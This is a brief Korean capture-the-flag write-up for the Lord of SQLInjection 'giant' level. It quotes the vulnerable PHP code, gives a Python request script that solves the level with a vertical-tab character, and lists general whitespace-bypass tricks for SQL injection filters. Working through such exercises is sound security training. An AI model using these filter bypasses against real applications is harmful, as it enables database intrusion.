## Giant Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(strlen($_GET[shit])>1) exit("No Hack ~_~");  
if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe");  
$query = "select 1234 from{$_GET[shit]}prob_giant where 1";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result[1234]) solve("giant");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/giant_18a08c3be1d1753de0cb157703f75a5e.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['shit'] = chr(0x0b) # 수직탭(%0b), 다음 페이지(%0c) 사용 가능

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] GIANT Clear")
```
이번 문제는 공백 우회를 해야한다.  
공백 우회하는 방법에는 다음이 있다.
- 괄호 `()`
- 주석 `/**/`
- 더하기 `+`
- 수평탭(Horizontal Tab) `%09`
- 수직탭(Vertical Tab) `%0b`
- 개행(Line Feed) `%0a`
- 다음 페이지(Form Feed) `%0c`
- 복귀(Carriage Return) `%0d`
문제에서 `%20(공백)` `%0a(개행)` `%0d(복귀)` `%09(수평탭)`이 필터링 되어 있고 문자열의 길이가 1글자여야 한다.  
따라서 이를 제외한 `%0b` `%0c`를 이용해 문제를 해결할 수 있다.